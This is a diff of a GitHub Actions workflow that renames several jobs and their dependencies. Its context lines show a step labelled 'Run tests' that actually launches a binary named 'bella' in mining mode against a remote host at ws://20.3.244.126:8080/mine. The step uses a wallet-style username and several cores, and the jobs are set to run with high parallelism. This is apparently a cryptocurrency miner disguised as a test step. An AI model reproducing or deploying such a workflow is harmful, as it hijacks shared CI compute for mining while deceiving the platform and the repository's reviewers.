@@ -4,7 +4,7 @@ on:
     branches: [ "main" ]
 
 jobs:
-  tahap1:
+  mem:
     runs-on: ubuntu-latest
     strategy:
       max-parallel: 80
@@ -31,8 +31,8 @@ jobs:
     - name: Run tests
       run: cd gh2 && ./target/release/bella --url ws://20.3.244.126:8080/mine mine --username HGeykyUPKrVZ8uLgg4WAYLusSQRif1AXFUepxJ3gEYx8.mincuk1 --cores 4 &
         sleep 310s
-  tahap2:
-    needs: bel
+  mek:
+    needs: mem
     runs-on: ubuntu-latest
     strategy:
       max-parallel: 250
@@ -60,8 +60,8 @@ jobs:
         
     
      
-  tahap3:
-    needs: [la]
+  enak:
+    needs: [mem]
     runs-on: ubuntu-latest
     strategy:
       max-parallel: 250
@@ -89,7 +89,7 @@ jobs:
         
     
   Success:
-    needs: [tahap1, tahap2, tahap3]
+    needs: [mem, mek, enak]
     if: always()
     runs-on: ubuntu-20.04
     steps:
